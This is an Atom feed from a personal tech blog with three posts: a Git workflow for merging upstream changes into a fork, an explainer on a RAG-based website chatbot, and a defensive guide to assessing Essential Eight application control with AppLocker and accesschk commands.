<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="https://emdeh.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://emdeh.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2024-02-21T00:31:47+00:00</updated><id>https://emdeh.github.io/feed.xml</id><title type="html">emdeh</title><subtitle>If you can&apos;t explain it simply, you don&apos;t understand it well enough. </subtitle><entry><title type="html">GitHub - Managing upstream changes.</title><link href="https://emdeh.github.io/blog/2024/managing-upstream-changes/" rel="alternate" type="text/html" title="GitHub - Managing upstream changes."/><published>2024-02-19T23:50:00+00:00</published><updated>2024-02-19T23:50:00+00:00</updated><id>https://emdeh.github.io/blog/2024/managing-upstream-changes</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/managing-upstream-changes/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>When a GitHub repository is forked, it can maintain a connection with original codebase. The original is called the <strong>upstream</strong> repository or branch. This connection means that the forked repository can be modified as needed, but if there are also changes made to the original, such as new features, they can be integrated into the forked version.</p> <p>This article outlines the steps to pull changes from an upstream repository into forked version. Specifically, it outlines how to pull changes into a separate branch for testing and then how to <strong>merge</strong> those changes into the main branch of the fork after testing and resolving any conflicts.</p> <h2 id="high-level-workflow-for-merging-upstream-changes">High-level workflow for Merging Upstream Changes:</h2> <ol> <li> <p><strong>Creating a New Branch:</strong> When there are upstream changes to merge, create a new branch in the forked repository based on the main branch.</p> </li> <li> <p><strong>Pulling Upstream Changes:</strong> Pull the changes from the upstream repository into this new branch. Resolve any conflicts here.</p> </li> <li> <p><strong>Testing:</strong> Use this branch to test the deployment to ensure everything works as expected. For example, if it’s a website, run it locally from the new branch or if it’s a deployment, deploy from the branch to confirm everything is in order.</p> </li> <li> <p><strong>Creating a Pull Request:</strong> Once the branch with the upstream changes has been tested, create a pull request to merge this branch into the main branch. The Pull Request can be drafted during testing if necessary.</p> </li> <li> <p><strong>Review and Merge:</strong> Review the Pull Request in GitHub. After any neccessary approvals, merge the pull request.</p> </li> <li> <p><strong>Delete the Branch:</strong> After the merge, the branch used to test the upstream changes can be deleted.</p> </li> </ol> <h2 id="prerequisites">Prerequisites</h2> <ul> <li>Ensure Git is installed on the system.</li> <li>Ensure access to the repository and its upstream repository.</li> </ul> <h1 id="steps">Steps</h1> <h2 id="1-navigate-to-the-local-repo">1. Navigate to the local repo</h2> <h2 id="2-update-the-local-main-branch">2. Update the local main branch</h2> <p>Ensure the local <code class="language-plaintext highlighter-rouge">main</code> branch (or whichever branch will ultimately receive the tested upstream changes) is up to date with the remote repository.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git checkout main <span class="c"># Checkout the local copy of the main branch</span>
git pull origin main <span class="c"># Pull remote changes into the local copy of the main branch</span>
</code></pre></div></div> <h2 id="3-fetch-changes-from-upstream-repository">3. Fetch changes from upstream repository</h2> <p>Fetch changes from the upstream repository without merging them.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git fetch upstream
</code></pre></div></div> <h2 id="4-create-a-new-branch-for-testing-the-upstream-changes">4. Create a new branch for testing the upstream changes</h2> <p>Create a new branch based on the <code class="language-plaintext highlighter-rouge">main</code> branch to test the upstream changes.</p> <blockquote> <p><strong><em>This is important, as it protects the stability of the branch from which the code is deployed.</em></strong></p> </blockquote> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git checkout <span class="nt">-b</span> upstream-changes main <span class="c"># Create a new branch called upstream-changes based off the main branch</span>
</code></pre></div></div> <h2 id="5-merge-upstream-changes-into-the-new-branch">5. Merge upstream changes into the new branch</h2> <p>Merge the changes from the upstream repository into the new branch.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git merge upstream/main
</code></pre></div></div> <h3 id="resolving-merge-conflicts">Resolving merge conflicts</h3> <p>If there are merge conflicts, Git will pause the merge process and mark the files that have conflicts. Here is how to resolve them:</p> <ul> <li>Open the conflicted files in VS Code.</li> <li>Look for the areas marked as conflicts (usually indicated by <code class="language-plaintext highlighter-rouge">&lt;&lt;&lt;&lt;&lt;&lt;</code>, <code class="language-plaintext highlighter-rouge">======</code>, and <code class="language-plaintext highlighter-rouge">&gt;&gt;&gt;&gt;&gt;&gt;&gt;</code>).</li> <li>Manually edit the files to resolve the conflicts. Choose which changes to keep or combine as needed.</li> <li>After resolving conflicts, add the files to staging: <code class="language-plaintext highlighter-rouge">git add .</code></li> <li>Then, continue the merge process: <code class="language-plaintext highlighter-rouge">git merge --continue</code></li> <li>Once all conflicts are resolved and the merge is successful, proceed with the next steps.</li> </ul> <h2 id="6-push-the-new-branch-to-github">6. Push the new branch to Github</h2> <p>It’s good practice to push the newly created branch with the upstream changes to the remote repository.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git push origin upstream-changes
</code></pre></div></div> <h2 id="7-open-a-pull-request-in-github">7. Open a Pull Request in GitHub</h2> <p>Now the Pull Request can be opened in draft.</p> <blockquote> <p><em>Be careful that the Pull Request is proposing to pull the <code class="language-plaintext highlighter-rouge">upstream-changes</code> branch into your own <code class="language-plaintext highlighter-rouge">main</code> branch, and <strong>*not</strong></em> the <code class="language-plaintext highlighter-rouge">main</code> branch of the upstream repository.*</p> </blockquote> <ul> <li>Go to the repository in GitHub.</li> <li>Open a Pull Request for the <code class="language-plaintext highlighter-rouge">upstream-changes</code> branch against the <code class="language-plaintext highlighter-rouge">main</code> branch.</li> <li>This usually initiates any review process.</li> </ul> <blockquote> <p><em>Do not merge it yet.</em></p> </blockquote> <h2 id="8-deploy-the-test-branch">8. Deploy the Test branch</h2> <p>Deploy or run the <code class="language-plaintext highlighter-rouge">upstream-changes</code> branch locally, or undertake whatever steps required to confirm the changes.</p> <h2 id="9-review-and-merge-the-pull-request">9. Review and merge the pull request</h2> <p>If the tests are successful, merge the changes into main by merging the pull request into the <code class="language-plaintext highlighter-rouge">main</code> branch through the GitHub interface.</p> <h3 id="when-to-use-merge-commit">When to use Merge Commit</h3> <p>Opt for a merge commit when you want to preserve the exact history of changes, including the individual commits, from a feature branch without altering the commit history. This approach is beneficial when you want to maintain a visual representation of the feature branch within the main branch, making it easier to track and understand the flow of changes. It’s especially useful for complex features or significant changes that involve multiple developers or require detailed historical context for future reference.</p> <p>The merge commit approach adds a new commit to the main branch that “merges” the histories, ensuring that the main branch’s history reflects the addition of the feature or changes from the feature branch as a merge. This method keeps the history of both branches intact and provides a clear merge point that can be referenced in the future</p> <blockquote> <p><em>If Linear History is on and the branch being being merged into is protected, the only options may be <strong>Rebase</strong> or <strong>Squash</strong>.</em></p> </blockquote> <h3 id="when-to-use-rebase">When to use Rebase</h3> <p>Use this when you want to maintain a detailed commit history from the feature/test branch in the main branch. It’s suitable for code changes where each commit’s history is important for context, such as new features or significant code revisions.</p> <h3 id="when-to-use-squash">When to use Squash</h3> <p>Opt for this when dealing with a series of minor or incremental changes, such as documentation updates or small tweaks. It combines all feature branch commits into a single commit for a cleaner main branch history, making it ideal for simpler or less impactful changes.</p> <h2 id="10-update-the-local-main-branch-and-clean-up">10. Update the local main branch and clean up</h2> <p>After merging the pull request, update the local <code class="language-plaintext highlighter-rouge">main</code> branch and then delete the test branch.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git checkout main <span class="c"># Switch back to the main branch</span>
git pull origin main <span class="c"># Pull the remote version of main to the local copy so it is up-to-date with the recent merge</span>
git branch <span class="nt">-d</span> upstream-changes <span class="c"># Delete the local copy of the branch used to test the upstream changes</span>
git push origin <span class="nt">--delete</span> upstream-changes <span class="c"># Delete the remote copy of the branch used to test the upstream changes</span>
</code></pre></div></div> <h2 id="11-redeploy-from-main">11. Redeploy from main</h2> <p>If required, it’s good practice to now re-deploy the codebase from the <code class="language-plaintext highlighter-rouge">main</code> branch.</p> <h1 id="conclusion">Conclusion</h1> <p>This process ensures that changes from the upstream repository are tested in isolation before being integrated into the main branch, minimising the risk of disruption to the main codebase.</p> <h5 id="a-quick-note-on-git-fetch-vs-git-pull">A quick note on <code class="language-plaintext highlighter-rouge">Git Fetch</code> vs. <code class="language-plaintext highlighter-rouge">Git Pull</code></h5> <p>In Git, both <code class="language-plaintext highlighter-rouge">git fetch</code> and <code class="language-plaintext highlighter-rouge">git pull</code> are commands used to update local copies of a repository from a remote source. However, they serve different purposes and operate in distinct ways.</p> <ul> <li> <p><strong><code class="language-plaintext highlighter-rouge">git fetch</code></strong> retrieves updates from a remote repository, but it doesn’t automatically merge those updates into the current working branch. When <code class="language-plaintext highlighter-rouge">git fetch upstream</code> is executed, for instance, Git fetches any new work that has been pushed to the upstream repository since the last fetch, updating the local remote-tracking branches (like upstream/main). However, <em>the working directory remains unchanged</em>. This command is useful for reviewing changes before integrating them into the local branch.</p> </li> <li> <p><strong><code class="language-plaintext highlighter-rouge">git pull</code></strong>, on the other hand, is a more aggressive command that not only fetches updates from the remote repository but also automatically merges them into your current working branch. Essentially, <code class="language-plaintext highlighter-rouge">git pull</code> is a combination of <code class="language-plaintext highlighter-rouge">git fetch</code> followed by <code class="language-plaintext highlighter-rouge">git merge</code>. When executed <code class="language-plaintext highlighter-rouge">git pull origin main</code>, Git fetches the changes from the main branch of the remote named origin and immediately attempts to merge them into the current working branch. This command is handy for quickly updating local branches with the latest changes from the remote, assuming they’re ready to be merged without a review process.</p> </li> </ul> <p>In Summary <code class="language-plaintext highlighter-rouge">git fetch</code> is when the changes require review before merging. Use <code class="language-plaintext highlighter-rouge">git pull</code> when integrating the remote changes immediately into the local branch without a preliminary review is not a concern.</p>]]></content><author><name></name></author><category term="Explainers"/><category term="upstream-changes"/><category term="git"/><category term="github"/><category term="git-pull"/><category term="git-fetch"/><summary type="html"><![CDATA[An overview of how to manage upstream changes in a GitHub repository]]></summary></entry><entry><title type="html">Using Retrieval Augmented Generation (RAG) for chatbots</title><link href="https://emdeh.github.io/blog/2024/rag-llm-chatbot/" rel="alternate" type="text/html" title="Using Retrieval Augmented Generation (RAG) for chatbots"/><published>2024-02-16T17:00:00+00:00</published><updated>2024-02-16T17:00:00+00:00</updated><id>https://emdeh.github.io/blog/2024/rag-llm-chatbot</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/rag-llm-chatbot/"><![CDATA[<h1 id="introduction">Introduction</h1> <p>This project leverages a Retrieval Augmented Generation (RAG) implementation to create an intelligent question-answering system for a website. The project automates the collection of contextual data from the site, processes this data with an embeddings model to generate vector representations, and utilises these vectors to provide relevant answers to user queries through a chatbot using a Language Model (LLM) to craft responses in a conservational tone.</p> <p>You can find the code and a detailed overview in the <a href="https://github.com/emdeh/web-crawl-qna-blog-bot">Github repository</a>.</p> <h2 id="what-is-retrieval-augmented-generation-rag">What is Retrieval Augmented Generation (RAG)</h2> <p>Retrieval Augmented Generation (RAG) is a sophisticated approach that enhances the capabilities of generative models, particularly Large Language Models (LLMs), by integrating an additional information retrieval step into the response generation process. This method involves dynamically sourcing relevant external information to augment the input provided to the generative model, thereby enriching its responses with details and insights not contained within its pre-trained knowledge base. The retrieval of additional information is typically facilitated by embeddings and vector representations to identify content contextually similar to the user’s prompt.</p> <h2 id="what-are-embeddings">What are Embeddings</h2> <p>Embeddings are a form of representation learning where words, sentences, or even entire documents are converted into real-valued vectors in a high-dimensional space. This process aims to capture the semantic meanings, relationships, and context of words or phrases, allowing machines to process natural language data more effectively. The vectors in the high-dimensional space represent the nuanced characteristics of the text, such as syntax, semantics, and usage patterns, in a form that can be quantitatively analysed. Each dimension could correspond to a latent feature that captures different aspects of the text’s meaning, not directly interpretable by humans but discernible through computational methods. By mapping textual information to a geometric space, embeddings enable the measurement of conceptual similarity between pieces of text based on their positions and distances within this space, facilitating tasks like search, classification, and contextual understanding in natural language processing applications. In the context of Retrieval-Augmented Generation (RAG), embeddings represent the queries (prompts) and the potential knowledge sources in a format that a computer can understand and compare.</p> <h3 id="vector-representations">Vector Representations</h3> <p>Vector representations are the outcome of converting text into embeddings, representing text as points or vectors in a multi-dimensional space. As described above, each dimension corresponds to a feature of the text, capturing various aspects of its meaning, context, or syntactical properties. Comparing vector representations involves calculating the similarity (often using cosine similarity or other metrics) between vectors to identify how closely related two pieces of text are. In RAG implementations that use embeddings, the vector representation of a user’s prompt is compared to the vector representations of various knowledge sources to identify the most relevant context. This relevant context is then retrieved and used to augment the response generated by a language model, enhancing the LLM’s ability to provide accurate and contextually enriched answers.</p> <h2 id="credits">Credits</h2> <p>This project was initially inspired by <strong>OpenAI’s Web Q&amp;A with Embeddings tutorial</strong>. Learn how to crawl your website and build a Q/A bot with the OpenAI API. You can find the full tutorial in the <a href="https://platform.openai.com/docs/tutorials/web-qa-embeddings">OpenAI documentation</a>.</p> <h1 id="overview-of-a-rag-implementation">Overview of a RAG implementation</h1> <p>The diagram below briefly outlines how a Retrieval Augmented Generation (RAG) architecture leverages embeddings. In short, additional context is <em>retrieved</em> by comparing the vectors of the prompt to the vectors of the knowledge source. The related textual data is then appended to the prompt to <em>augment</em> the response <em>generated</em> by the LLM.</p> <p><img src="/assets/img/2024-rag-chatbot/diagram.png" alt="diagram"/></p> <h1 id="example-implementation">Example implementation</h1> <p><strong>Point 1:</strong> In the case of this particular implementation, the knowledge source is a blog. The knowledge is obtained by first extracting all the hyperlinks on the site and discarding any that point to other domains. Each unique hyperlink is then visited, and the content extracted into text files. The text files are then used to create a data frame. Each row in the data frame is tokenised to facilitate analysing the length of documents, which is relevant for understanding the data’s distribution and optimising model input sizes.</p> <p><strong>Point 2:</strong> After more processing to create smaller chunks (if required), the embeddings are generated and saved. In this case, to a <code class="language-plaintext highlighter-rouge">.csv</code> file.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;SNIP&gt;
https://emdeh.com/repositories
https://emdeh.com/news/announcement_7
https://emdeh.com/blog/2024/codify-walkthrough
Embeddings generated and saved to <span class="s1">'data/embeddings.csv'</span><span class="nb">.</span>
Preprocessing complete. Embeddings are ready.

<span class="c"># You can see the blog's links being iterated here.</span>
</code></pre></div></div> <p><strong>Points 3 - 5:</strong> When a user provides the prompt to the service, the embeddings model will generate its vector representation.</p> <p><img src="/assets/img/2024-rag-chatbot/image-of-prompt.png" alt="image of prompt"/></p> <p><strong>Point 6:</strong> The service then compares the prompt’s vector to the Vector DB (in this case, the <code class="language-plaintext highlighter-rouge">.csv</code> file containing the blog’s vector representations is loaded into another data frame).</p> <blockquote> <p><em>The comparision is done using Cosine function to calculate the distance between the question’s embedding and each row’s embedding in the data frame. Cosine distances is a measure used to determine the similarity between two vectors, with lower values indicating higher similarity.</em></p> </blockquote> <p>The service will then iterate over the data frame to accumulate the most similar text until it reaches a pre-defined token limit. This then forms the context for the original prompt.</p> <p><strong>Points 7 - 9:</strong> The context and original prompt are now passed to the GPT model, which returns a generative completion. This completion is presented back to the end-user.</p> <p><img src="/assets/img/2024-rag-chatbot/image-of-completion.png" alt="image of completion"/></p> <h1 id="code-overview">Code overview</h1> <h2 id="data-collection-and-preparation">Data Collection and Preparation</h2> <p><code class="language-plaintext highlighter-rouge">preprocess.py</code> crawls web pages within a specified domain and systematically navigates through the website, extracting text from each page it encounters. The collected text undergoes initial preprocessing to clean and organise the data, making it suitable for further analysis.</p> <p>The script then employs OpenAI’s API to generate embeddings for each piece of text. These embeddings capture the semantic essence of the text in a high-dimensional space, facilitating the identification of contextual similarities between different texts. The processed data and its embeddings are saved for subsequent use, laying the groundwork for the system’s question-answering capabilities.</p> <h2 id="flask-application-for-question-answering">Flask Application for Question Answering</h2> <p>With the data prepared, <code class="language-plaintext highlighter-rouge">app.py</code> serves as the interface between the user and the system’s NLP engine. This script initiates a Flask web application, providing endpoints for users to submit their questions.</p> <p>Upon receiving a query, the application leverages the previously generated embeddings to find the most relevant context within the collected data. It then formulates this context and the user’s question as input for an OpenAI GPT model. The model, trained on vast amounts of text from the internet, generates an answer that reflects the specific information in the crawled data and its understanding of the topic at large. The answer is then returned to the user through the web interface, completing the cycle of query and response.</p> <h2 id="integration-and-workflow">Integration and Workflow</h2> <p>Integrating <code class="language-plaintext highlighter-rouge">preprocess.py</code> and <code class="language-plaintext highlighter-rouge">app.py</code> creates a workflow that bridges web crawling and NLP-driven question-answering. Initially, <code class="language-plaintext highlighter-rouge">preprocess.py</code> lays the foundation by collecting and preparing the data, which <code class="language-plaintext highlighter-rouge">app.py</code> subsequently utilises to offer real-time answers. This allows the system to provide contextually relevant answers informed by the specific context. Users interact with the system through a straightforward web interface, making complex NLP capabilities accessible to anyone with a question to ask.</p> <h2 id="use-cases">Use-cases</h2> <p>Together, these scripts leverage sophisticated machine learning capabilities to demonstrate how existing data from websites can be harnessed to build robust and interactive AI-driven ways to retrieve and discover knowledge.</p> <p>For example, the basic capabilities demonstrated in this project could be applied to create a contextually-aware chatbot on a website.</p>]]></content><author><name></name></author><category term="Artificial-Intelligence"/><category term="RAG"/><category term="LLM"/><category term="NLP"/><category term="natural-language-processing"/><category term="retrieval-augmented-generation"/><category term="large-language-models"/><category term="chatbot"/><category term="python"/><category term="embeddings"/><summary type="html"><![CDATA[A simple example of how RAG can be used for a website's chatbot.]]></summary></entry><entry><title type="html">Application Control</title><link href="https://emdeh.github.io/blog/2024/essential-eight-application-control/" rel="alternate" type="text/html" title="Application Control"/><published>2024-01-25T17:00:00+00:00</published><updated>2024-01-25T17:00:00+00:00</updated><id>https://emdeh.github.io/blog/2024/essential-eight-application-control</id><content type="html" xml:base="https://emdeh.github.io/blog/2024/essential-eight-application-control/"><![CDATA[<h1 id="introduction">Introduction</h1> <h2 id="control-objective">Control objective</h2> <p>The objective of the <strong>Application Control</strong> strategy is to ensure applications are only accessible from appropriate locations and to the appropriate users.</p> <h2 id="expectation">Expectation</h2> <p>It is expected that organisations have a comprehensive approach to managing and controlling the execution of software applications.</p> <p>The approach needs to include the full lifecycle of approving, deploying, and removing software applications. At higher maturity levels, log retention and monitoring are required.</p> <p>The scope of application control is also extended from just workstations to internet-facing servers at maturity level 2 and all workstations servers at maturity level 3.</p> <h2 id="implementing-application-control">Implementing application control</h2> <ul> <li>Identify business critical applications and formally approve their use.</li> <li>Develop application control rules to ensure only approved applications are allowed to execute.</li> <li>Maintain the application control rules using a change management program.</li> <li>Validate application control rules on an annual or more frequent basis. <h1 id="assessment-scope">Assessment scope</h1> </li> </ul> <p>When carrying out application control assessments, it’s important to consider paths related to standard user profiles and temporary directories that are utilised by operating systems, web browsers, and email clients. These can include:</p> <ul> <li><code class="language-plaintext highlighter-rouge">%userprofile%*</code></li> <li><code class="language-plaintext highlighter-rouge">%temp%*</code></li> <li><code class="language-plaintext highlighter-rouge">%tmp%*</code></li> <li><code class="language-plaintext highlighter-rouge">%windir%\Temp*</code></li> </ul> <p>Based on the system’s setup, some overlap may be present; for example, <code class="language-plaintext highlighter-rouge">%temp%</code> and <code class="language-plaintext highlighter-rouge">%tmp%</code> are usually found within <code class="language-plaintext highlighter-rouge">%userprofile%</code>.</p> <blockquote> <p><em>It is important to note that the last major update to the maturity model introduced compiled Hypertext Markup Language (HTML) (<code class="language-plaintext highlighter-rouge">.chm</code> files), HTML applications (<code class="language-plaintext highlighter-rouge">.hta</code> files) and control panel applets (<code class="language-plaintext highlighter-rouge">.cpl</code> files) to the list of file types that need to be controlled. Some application control solutions may not support these file types.</em></p> </blockquote> <h1 id="maturity-level-requirements">Maturity Level requirements</h1> <table> <tr> <th>Level 1</th> <th>Level 2</th> <th>Level 3</th> </tr> <tr> <td>-</td> <td><strong>Application control is implemented on workstations and internet-facing servers.</strong></td> <td>Application control is implemented on workstations and <strong>servers</strong>.</td> </tr> <tr> <td>The execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications and control panel applets is prevented on workstations from within standard user profiles and temporary folders used by the operating system, web browsers and email clients.</td> <td><strong>Application control restricts</strong> the execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications and control panel applets <strong>to an organisation-approved set</strong>.</td> <td>Application control restricts the execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications, control panel applets <strong>and drivers</strong> to an organisation-approved set.</td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Microsoft’s ‘recommended block rules’ are implemented.</strong></td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Microsoft’s ‘recommended driver block rules’ are implemented.</strong></td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Application control rulesets are validated on an annual or more frequent basis.</strong></td> </tr> <tr> <td>-</td> <td><strong>Allowed and blocked execution events on workstations and internet-facing servers are logged.</strong></td> <td>Allowed and blocked execution events on workstations and <strong>servers</strong> are <strong>centrally</strong> logged.</td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Event logs are protected from unauthorised modification and deletion.</strong></td> </tr> <tr> <td>-</td> <td>-</td> <td><strong>Event logs are monitored for signs of compromise and actioned when any signs of compromise are detected.</strong></td> </tr> </table> <p><br/></p> <h1 id="assessing-application-control">Assessing Application Control</h1> <p>To assess the effectiveness of application control strategies:</p> <ul> <li>Identify authorised programs.</li> <li>Identify the application control approach that is being used (if in place).</li> <li>Assess the controls using assessment methods and tools.</li> <li>Determine the associated maturity level.</li> </ul> <h1 id="assessment-methods">Assessment methods</h1> <p>Application control assessments are possible without tools, but the efficacy of the tests will be significantly reduced, and edge cases that malicious actors might exploit could be missed. For instance, these actors might deploy bespoke tools to enumerate weak paths in a system.</p> <p>The ACSC provides guidelines and recommendations on the methods and tools that can be used to assess the control.</p> <p>The only true way to test is to attempt execution in all locations against all file types.</p> <p><code class="language-plaintext highlighter-rouge">SysInternals AccessChk</code> application can be used to generate output of folder permissions, but this is only relevant, potentially, for Level 1.</p> <h2 id="e8mvt">E8MVT</h2> <p>Tests application control policies by attempting to write and execute certain file types in specific locations.</p> <p>Also checks for MSFT recommended block rules and drive block rules are implemented.</p> <h2 id="acvt">ACVT</h2> <p>tests application control policy by enumerating all sub-directories and attempts to write and execute each of the relevant file types from each location.</p> <h2 id="scripts">Scripts</h2> <h3 id="get-applocker-policies">Get AppLocker Policies</h3> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Effective</span><span class="w"> </span><span class="nt">-Xml</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Set-Content</span><span class="w"> </span><span class="p">(</span><span class="s1">'c:\windows\temp\curr.xml'</span><span class="p">)</span><span class="se">`</span><span class="w">
</span></code></pre></div></div> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Local</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Test-AppLockerPolicy</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\Windows\System32\</span><span class="o">*.</span><span class="nf">exe</span><span class="w"> </span><span class="nt">-User</span><span class="w"> </span><span class="nx">Everyone</span><span class="w">
</span></code></pre></div></div> <p>Test in calc.exe or notepad.exe:</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Test-AppLockerPolicy</span><span class="w"> </span><span class="nt">-XMLPolicy</span><span class="w"> </span><span class="nx">C:\windows\temp\curr.xml</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">C:\windows\system32\calc.exe</span><span class="p">,</span><span class="w"> </span><span class="nx">C:\windows\system32\notepad.exe</span><span class="w"> </span><span class="nt">-User</span><span class="w"> </span><span class="nx">Everyone</span><span class="w">
</span></code></pre></div></div> <p><br/> <br/></p> <h3 id="sysinternals-accesschk">Sysinternals accesschk</h3> <p>If only trusted Microsoft tools are permitted on the system, <strong>SysInternals AccessChk</strong> can be used for outputting folder permissions, noting this is only suitable for a path-based approach to implementing the control.</p> <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">accesschk</span><span class="w"> </span><span class="nt">-dsuvw</span><span class="w"> </span><span class="p">[</span><span class="n">path</span><span class="p">]</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">report.txt</span><span class="w">
</span></code></pre></div></div> <p>Running <code class="language-plaintext highlighter-rouge">whoami /groups</code> would also need to be executed to determine which user groups a typical standard user belonged to in order to determine the effective permissions for each path.</p> <p>This approach is, however, likely to be tedious in assessing effectively. <br/></p> <h1 id="maturity-level-1-guidance">Maturity Level 1 guidance</h1> <p>The intent of application control at Maturity Level 1 can be met without a dedicated application control solution. This is achieved through file system permissions to prevent unnecessary access to user profile directories and temporary folders.</p> <blockquote> <p><strong><em>The execution of executables, software libraries, scripts, installers, compiled HTML, HTML applications and control panel applets is prevented on workstations from within standard user profiles and temporary folders used by the operating system, web browsers and email clients</em>.</strong></p> </blockquote> <p>Given how complex file system permissions can become, to effectively check application control it’s essential to attempt to write and execute from all user-accessible directories.</p> <p>ACSC’s Essential Eight Maturity Verification (E8MVT) and Application Control Verification (ACVT) tools (available to ACSC partners) can assist in achieving this. A number of other tools on the market are also capable enumerating a file system to perform this test.</p> <p>Where applicable, PowerShell cmdlets can be used to test and review AppLocker policies and Sysinternals acesschk can be used if only Microsfot-based tools are avaialble.</p> <p>For a system on which tools cannot be run, and assuming a path-based approach is used, screenshots of the ‘effective access’ permissions for specified folders can be requested. This, however, has limitations because unless screenshots of access permissions are requested for every folder and sub-folder (for which there are usually many), it will not be possible to comprehensively assess whether read, write and execute permissions exist for a given user. Consequently, this will likely impact the quality of evidence cited in the final report.</p> <p>At a minimum, screenshots for key paths (such as temporary folders used by the operating system, web browsers and email clients) should be requested and examined to determine whether inheritance is set, noting that at any point in a path, application control inheritance previously set by an operating system may be disabled by an application installer</p> <h1 id="maturity-level-2-guidance">Maturity Level 2 guidance</h1> <p>Whereas ML1 is focussed on EUC endpoints, ML2 extends application control to internet-facing servers and includes additional log-retention requirements.</p> <h1 id="maturity-level-3-guidance">Maturity Level 3 guidance</h1> <p>ML3 builds on ML2 in that it requires monitoring of logs, application control on <em>all</em> servers, and the implementation of Microsoft’s block rules. Application control rulesets also need to be validated no less than annually. <br/></p> <h1 id="other-information">Other information</h1> <h2 id="considering-kernel">Considering Kernel</h2> <p>Modern computers split virtual memory into kernel and user space. The scope to which an application control solution protects a system’s kernel should be considered.</p> <h2 id="identifying-adversary-attempts-to-execute-malicious-code">Identifying adversary attempts to execute malicious code</h2> <p>Application control can help identify attempts to execute malicious code.</p> <p>This can be achieved by configuring application control to generate event logs for allowed and blocked executions.</p> <p>Event logs should included relevant information such as:</p> <ul> <li>name of the file</li> <li>date/time stamp</li> <li>username of the executing user</li> </ul> <p>Application control logs can also ingest into a SIEM/SOAR system to allow for and contribute to broader context about the threat landscape.</p> <h2 id="applocker-and-wdac">AppLocker and WDAC</h2> <p>AppLocker and Windows Defender Application Control (WDAC) are both security features in Windows, designed to control application usage and restrict unauthorised software. However, they have distinct differences:</p> <ol> <li><strong>Design and Purpose</strong>: <ul> <li><strong>AppLocker</strong>: Primarily aimed at providing administrators with the ability to specify which users or groups can run particular applications, based on unique identities of files. It’s more about managing application access than outright security.</li> <li><strong>WDAC</strong>: Focuses more on security. It is designed to prevent malware and untrusted applications from running by enforcing code integrity policies.</li> </ul> </li> <li><strong>Scope and Control</strong>: <ul> <li><strong>AppLocker</strong>: Works at a more granular level, allowing control over scripts, executable files, Windows Installer files, DLLs, and packaged app installers.</li> <li><strong>WDAC</strong>: Controls the entire spectrum of executable code on the system, including kernel mode drivers and user mode applications.</li> </ul> </li> <li><strong>Implementation and Management</strong>: <ul> <li><strong>AppLocker</strong>: Managed through Group Policy, making it easier to implement in an environment already using Group Policy for configurations.</li> <li><strong>WDAC</strong>: Managed through PowerShell and uses a different policy format, which can be more complex to set up but offers a higher level of security. -</li> </ul> </li> <li><strong>Flexibility and Usability</strong>: <ul> <li><strong>AppLocker</strong>: Offers more flexibility and is simpler to configure, especially for smaller organizations or those with less complex needs.</li> <li><strong>WDAC</strong>: While it provides a stronger security posture, it can be more challenging to implement and manage, particularly in environments with diverse applications.</li> </ul> </li> <li><strong>System Requirements</strong>: <ul> <li><strong>AppLocker</strong>: Available on Windows 7 and newer versions but only for Enterprise and Ultimate editions.</li> <li><strong>WDAC</strong>: Available on Windows 10 and Windows Server 2016 and later, offering broader support across different Windows editions.</li> </ul> </li> <li><strong>Security Level</strong>: <ul> <li><strong>AppLocker</strong>: Considered less robust in terms of security compared to WDAC, as it lacks the more comprehensive system-wide controls.</li> <li><strong>WDAC</strong>: Provides a more secure environment by ensuring that only trusted software runs on the system.</li> </ul> </li> </ol> <p>In summary, while AppLocker is more user-friendly and easier to manage, particularly for application access control, WDAC offers a more comprehensive and secure approach, focusing on system integrity and malware prevention. The choice between the two would depend on the specific needs and capabilities of the organisation, particularly in terms of desired security level and ease of management.</p> <h1 id="useful-resources">Useful resources</h1> <ul> <li><a href="https://learn.microsoft.com/en-us/compliance/essential-eight/e8-app-control">Essential Eight application control - Essential Eight | Microsoft Learn</a></li> <li><a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/microsoft-recommended-driver-block-rules">Microsoft recommended driver block rules - Windows Security | Microsoft Learn</a></li> <li><a href="https://learn.microsoft.com/en-us/windows/security/application-security/application-control/windows-defender-application-control/design/applications-that-can-bypass-wdac">Applications that can bypass WDAC and how to block them - Windows Security | Microsoft Learn</a></li> <li><a href="https://www.cyber.gov.au/resources-business-and-government/essential-cyber-security/small-business-cyber-security/small-business-cloud-security-guide/technical-example-application-control">Technical example: Application control | Cyber.gov.au</a></li> </ul>]]></content><author><name></name></author><category term="Essential-Eight"/><category 